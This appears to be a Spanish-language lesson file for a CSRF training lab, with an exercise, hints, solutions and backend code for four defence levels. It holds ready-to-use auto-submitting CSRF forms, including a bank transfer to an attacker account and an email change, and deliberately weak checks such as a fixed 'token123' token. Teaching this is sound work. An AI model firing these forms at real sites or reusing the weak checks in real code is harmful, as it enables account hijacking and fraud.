{
  "descripcion": "El **Cross-Site Request Forgery (CSRF)** es una vulnerabilidad que permite a un atacante realizar acciones en nombre de un usuario autenticado en una aplicación web, sin su consentimiento. El atacante engaña al navegador de la víctima para que envíe peticiones no deseadas (como transferencias de dinero, cambios de contraseña o borrado de datos) usando la sesión activa del usuario.\n\nCSRF explota el hecho de que los navegadores envían automáticamente las cookies de sesión con cada petición al dominio correspondiente, sin importar desde dónde se originó la petición. Si la aplicación no implementa mecanismos de protección, un atacante puede crear una página maliciosa que fuerce al navegador de la víctima a ejecutar acciones en la aplicación legítima.\n\n- **Modificar la contraseña de un usuario:** El atacante puede cambiar la contraseña de la víctima si la aplicación no protege el endpoint correspondiente.\n- **Realizar transferencias de dinero:** En aplicaciones bancarias, un CSRF puede transferir fondos sin el consentimiento del usuario.\n- **Cambiar la dirección de correo electrónico:** El atacante puede secuestrar cuentas cambiando el email asociado.\n- **Borrar información:** Puede eliminar datos personales, comentarios o archivos.\n\n**¿Quieres saber más?** Consulta estos recursos recomendados:\n\n- [OWASP: Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)\n- [PortSwigger Web Security Academy: CSRF](https://portswigger.net/web-security/csrf)\n- [Hacksplaining: Ejercicio interactivo de CSRF](https://www.hacksplaining.com/exercises/csrf)\n- [MDN Web Docs: CSRF](https://developer.mozilla.org/es/docs/Web/Security/Types_of_attacks#cross-site_request_forgery_csrf)\n",
  "descripcionEjercicios": "## Ejercicio: Explota CSRF para borrar comentarios en el foro\n\n**Contexto:** Imagina que participas en un foro online. Puedes borrar tus propios comentarios desde la interfaz, pero la funcionalidad **no está protegida contra CSRF**. Un atacante podría engañarte para que, al visitar una web maliciosa mientras tienes la sesión iniciada, se envíe una petición para borrar uno de tus comentarios sin tu consentimiento.\n\nAccede al entorno vulnerable del foro y trata de explotar la vulnerabilidad para borrar un comentario tuyo mediante un ataque CSRF.",
  "pistas": {
    "1": {
      "facil": "Crea un archivo HTML externo con un formulario que haga POST a /foro-borrar-comentario con el parámetro id del comentario que quieras borrar. Ábrelo en tu navegador mientras tienes la sesión iniciada en el foro.",
      "medio": "El backend verifica el Referer. Intenta hacer el ataque CSRF desde un origen distinto y observa si es bloqueado. ¿Puedes modificar el Referer?",
      "dificil": "Ahora necesitas un token CSRF. ¿Puedes adivinarlo o reutilizar un valor predecible como 'token123' en tu ataque?",
      "imposible": "El backend exige un token CSRF robusto y verifica el Referer. No deberías poder realizar el ataque CSRF en este nivel."
    }
  },
  "soluciones": {
    "1": {
      "facil": "1. Observa el ID del comentario que quieres borrar en el foro.\n2. Crea un archivo HTML externo con:\n\n<form action=\"http://localhost:5001/foro-borrar-comentario\" method=\"POST\">\n  <input type=\"hidden\" name=\"id\" value=\"1\">\n  <input type=\"submit\" value=\"Borrar\">\n</form>\n<script>document.forms[0].submit()</script>\n\n3. Ábrelo en tu navegador mientras tienes la sesión iniciada en el foro. El comentario será borrado.",
      "medio": "1. El backend verifica el Referer. Si haces el ataque desde un archivo local (file://) o un dominio distinto, será bloqueado.\n2. Prueba a modificar el Referer con extensiones o herramientas, o intenta desde el mismo dominio.\n3. Si el Referer es válido, el ataque funcionará; si no, será bloqueado.",
      "dificil": "1. El backend exige un token CSRF. Prueba a enviar el valor `token123` como `csrf_token` en el formulario.\n\n<form action=\"http://localhost:5001/foro-borrar-comentario\" method=\"POST\">\n  <input type=\"hidden\" name=\"id\" value=\"1\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"token123\">\n  <input type=\"submit\" value=\"Borrar\">\n</form>\n<script>document.forms[0].submit()</script>\n\n2. Si el token es correcto, el comentario será borrado.",
      "imposible": "El backend exige un token CSRF robusto y verifica el Referer. No puedes realizar el ataque CSRF, ya que el token es único por sesión y no puedes obtenerlo desde un sitio externo."
    }
  },
  "explicaciones": {
    "facil": "### Nivel Fácil\nEl backend no implementa ninguna protección CSRF. Cualquier petición POST válida con la cookie de sesión será aceptada, sin importar su origen.\n\n```python\n@app.route('/foro-borrar-comentario', methods=['POST'])\ndef foro_borrar_comentario():\n    id_comentario = request.form.get('id')\n    # ...borra el comentario...\n    return jsonify({\"success\": True}), 200\n```\nEs el escenario más vulnerable y didáctico para practicar ataques CSRF.",
    "medio": "### Nivel Medio\nEl backend verifica el encabezado `Referer` para asegurarse de que la petición proviene del mismo dominio. Si el Referer no es válido, la petición es bloqueada.\n\n```python\nreferer = request.headers.get('Referer', '')\nif not referer.startswith('http://localhost:3000'):\n    return jsonify({\"success\": False, \"error\": \"CSRF bloqueado (Referer)\"}), 403\n```\nEsta protección es mejor que nada, pero puede ser burlada si el atacante logra manipular el Referer o si el navegador no lo envía.",
    "dificil": "### Nivel Difícil\nEl backend exige un token CSRF, pero es un valor fijo y predecible (`token123`). Si el atacante conoce el valor, puede incluirlo en su ataque.\n\n```python\ntoken = request.form.get('csrf_token')\nif token != 'token123':\n    return jsonify({\"success\": False, \"error\": \"CSRF token inválido\"}), 403\n```\nEsta protección es débil, pero muestra la importancia de usar tokens aleatorios y únicos por sesión.",
    "imposible": "### Nivel Imposible\nEl backend exige un token CSRF robusto (único por sesión) y verifica el Referer. Solo el usuario legítimo puede obtener el token y enviarlo correctamente.\n\n```python\ntoken = request.form.get('csrf_token')\nif 'csrf_token' not in session or token != session['csrf_token']:\n    return jsonify({\"success\": False, \"error\": \"CSRF token inválido\"}), 403\nreferer = request.headers.get('Referer', '')\nif not referer.startswith('http://localhost:3000'):\n    return jsonify({\"success\": False, \"error\": \"CSRF bloqueado (Referer)\"}), 403\n```\nEs el nivel más seguro y realista para una aplicación protegida contra CSRF."
  },
  "ejemplo": "### Ejemplo 1: Transferencia bancaria\nImagina que estás autenticado en tu banco online y visitas una página maliciosa. Esa página puede enviar una petición para transferir dinero usando tus credenciales, sin que te des cuenta.\n\n```html\n<form action=\"https://banco.com/transferir\" method=\"POST\">\n  <input type=\"hidden\" name=\"cantidad\" value=\"1000\">\n  <input type=\"hidden\" name=\"destino\" value=\"cuenta_atacante\">\n  <input type=\"submit\" value=\"Enviar\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\nSi la aplicación no protege contra CSRF, esta petición se procesará como si la hubiera realizado el usuario legítimo.\n\n---\n\n### Ejemplo 2: Cambio de email\nUn atacante puede crear una página que cambie el email de la víctima en una aplicación vulnerable:\n\n```html\n<form action=\"https://ejemplo.com/cambiar-email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"atacante@evil.com\">\n  <input type=\"submit\" value=\"Cambiar email\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\nSi la víctima está autenticada, su email será cambiado sin que lo sepa.\n\n---\n\n### Ejemplo 3: Borrado de comentarios\nUn atacante puede forzar el borrado de un comentario en un foro vulnerable:\n\n```html\n<form action=\"http://localhost:5001/foro-borrar-comentario\" method=\"POST\">\n  <input type=\"hidden\" name=\"id\" value=\"1\">\n  <input type=\"submit\" value=\"Borrar\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\nSi la víctima está autenticada en el foro, el comentario con ID 1 será borrado."
}